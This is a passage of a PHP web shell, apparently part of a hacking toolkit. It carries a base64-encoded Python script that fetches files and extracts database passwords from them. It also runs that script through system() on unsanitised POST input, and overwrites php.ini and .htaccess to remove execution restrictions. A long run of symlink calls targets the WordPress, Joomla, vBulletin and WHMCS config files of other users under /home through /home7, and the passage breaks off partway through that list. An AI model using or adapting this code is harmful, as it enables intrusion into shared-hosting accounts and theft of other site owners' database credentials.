lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."> << BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
{
symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
